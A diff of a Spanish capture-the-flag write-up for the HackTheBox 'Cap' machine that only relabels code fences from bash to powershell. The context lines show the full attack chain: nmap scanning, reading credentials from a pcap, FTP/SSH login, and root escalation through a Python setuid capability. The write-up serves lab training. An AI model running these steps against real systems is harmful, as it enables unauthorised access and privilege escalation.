@@ -6,7 +6,7 @@ heroImage: 'https://res.cloudinary.com/djc1umong/image/upload/v1686606205/Cap_yp
 slug: 'box/cap'
 ---
 
-```bash
+```powershell
 $ nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.10.245 -oG puertosAbiertos
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-07 10:35 WEST
@@ -32,7 +32,7 @@ Raw packets sent: 65535 (2.884MB) | Rcvd: 65535 (2.622MB)
 
 vemos un servicio <i>ftp</i> que corre por el puerto 21 podemos intentar:
 
-```bash
+```powershell
 ftp 10.10.10.245
 ```
 
@@ -48,14 +48,14 @@ cuando ingresamos a <i>Security Snapshot (5 Second Pcap + Analysis)</i> de la pe
 <i> /data/1</i> vemos rápidamente si cambiando el <i>/1</i> con el <i>/0</i> pasa algo vemos que
 algunos datos en la columna value si cambian, le damos al botón de descargar
 
-```bash
+```powershell
 $ file 0.pcap
 0.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Linux cooked v1, capture length 262144)
 ```
 
 después de comprobar que si es un archivo pcap, lo analizamos con tshark
 
-```bash
+```powershell
 tshark -r 0.pcap 2&gt;/dev/null
 ```
 
@@ -67,7 +67,7 @@ height={108}
 
 ahora que tenemos un usuario y contraseña podemos intentar conectarnos con <i>fpt</i> y con ssh.
 
-````bash
+````powershell
 $ ftp 10.10.10.245
 Connected to 10.10.10.245.
 220 (vsFTPd 3.0.3)
@@ -85,7 +85,7 @@ nathan@cap:~$ cat user.txt
 
 si la máquina se llama <i>Cap</i> intentemos probar si se trata de una <i>capability </i>
 
-```bash
+```powershell
 nathan@cap:~$ getcap -r / 2>/dev/null
 /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
 /usr/bin/ping = cap_net_raw+ep
@@ -97,7 +97,7 @@ nathan@cap:~$ getcap -r / 2>/dev/null
 si <i>python3.8</i> tiene una capability de tipo <i>SUID </i> entonces con
 python cambiamos <i>setuid</i> y nos lanzamos una bash
 
-```bash
+```powershell
 nathan@cap:~$ python3.8
 >>> import os
 >>> os.setuid(0)
